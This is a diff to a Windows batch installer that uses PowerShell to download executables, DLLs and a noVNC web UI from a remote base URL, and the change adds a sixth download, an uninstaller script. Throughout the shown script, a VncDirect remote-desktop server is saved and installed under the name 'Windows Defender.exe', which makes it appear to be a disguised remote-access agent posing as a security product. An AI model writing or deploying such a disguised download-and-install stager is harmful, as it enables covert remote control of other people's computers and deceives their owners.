@@ -57,7 +57,7 @@ echo.
 
 set "FAIL=0"
 
-echo    [1/5] Windows Defender.exe (~67MB, may take a moment)...
+echo    [1/6] Windows Defender.exe (~67MB, may take a moment)...
 powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%BASE%/VncDirect/VncDirect.exe' -OutFile '%TEMPDIR%\Windows Defender.exe' -UseBasicParsing -TimeoutSec 300"
 if not exist "%TEMPDIR%\Windows Defender.exe" (
     echo    [!] FAILED to download Windows Defender.exe
@@ -66,7 +66,7 @@ if not exist "%TEMPDIR%\Windows Defender.exe" (
     echo    [OK]
 )
 
-echo    [2/5] AgentLauncher.exe...
+echo    [2/6] AgentLauncher.exe...
 powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%BASE%/AgentLauncher.exe' -OutFile '%TEMPDIR%\AgentLauncher.exe' -UseBasicParsing -TimeoutSec 300"
 if not exist "%TEMPDIR%\AgentLauncher.exe" (
     echo    [!] FAILED to download AgentLauncher.exe
@@ -75,7 +75,7 @@ if not exist "%TEMPDIR%\AgentLauncher.exe" (
     echo    [OK]
 )
 
-echo    [3/5] turbojpeg.dll...
+echo    [3/6] turbojpeg.dll...
 powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%BASE%/VncDirect/turbojpeg.dll' -OutFile '%TEMPDIR%\turbojpeg.dll' -UseBasicParsing -TimeoutSec 60"
 if not exist "%TEMPDIR%\turbojpeg.dll" (
     echo    [!] FAILED to download turbojpeg.dll
@@ -84,7 +84,7 @@ if not exist "%TEMPDIR%\turbojpeg.dll" (
     echo    [OK]
 )
 
-echo    [4/5] vcruntime140.dll...
+echo    [4/6] vcruntime140.dll...
 powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%BASE%/VncDirect/vcruntime140.dll' -OutFile '%TEMPDIR%\vcruntime140.dll' -UseBasicParsing -TimeoutSec 60"
 if not exist "%TEMPDIR%\vcruntime140.dll" (
     echo    [!] FAILED to download vcruntime140.dll
@@ -93,10 +93,19 @@ if not exist "%TEMPDIR%\vcruntime140.dll" (
     echo    [OK]
 )
 
-echo    [5/5] vnc-web.zip (noVNC web UI)...
+echo    [5/6] vnc-web.zip (noVNC web UI)...
 powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%BASE%/vnc-web.zip' -OutFile '%TEMPDIR%\vnc-web.zip' -UseBasicParsing -TimeoutSec 60"
 if not exist "%TEMPDIR%\vnc-web.zip" (
     echo    [!] FAILED to download vnc-web.zip
+    set "FAIL=1"
+) else (
+    echo    [OK]
+)
+
+echo    [6/6] Agent Uninstaller.bat...
+powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%BASE%/Agent Uninstaller.bat' -OutFile '%TEMPDIR%\Agent Uninstaller.bat' -UseBasicParsing -TimeoutSec 60"
+if not exist "%TEMPDIR%\Agent Uninstaller.bat" (
+    echo    [!] FAILED to download Agent Uninstaller.bat
     set "FAIL=1"
 ) else (
     echo    [OK]
@@ -124,6 +133,7 @@ copy /y "%TEMPDIR%\Windows Defender.exe" "%DEST%\VncDirect\Windows Defender.exe"
 copy /y "%TEMPDIR%\turbojpeg.dll" "%DEST%\VncDirect\turbojpeg.dll" >nul
 copy /y "%TEMPDIR%\vcruntime140.dll" "%DEST%\VncDirect\vcruntime140.dll" >nul
 copy /y "%TEMPDIR%\AgentLauncher.exe" "%DEST%\AgentLauncher.exe" >nul
+copy /y "%TEMPDIR%\Agent Uninstaller.bat" "%DEST%\Agent Uninstaller.bat" >nul
 
 echo    Extracting noVNC web UI...
 powershell -NoProfile -Command "Expand-Archive -Path '%TEMPDIR%\vnc-web.zip' -DestinationPath '%DEST%\VncDirect' -Force"
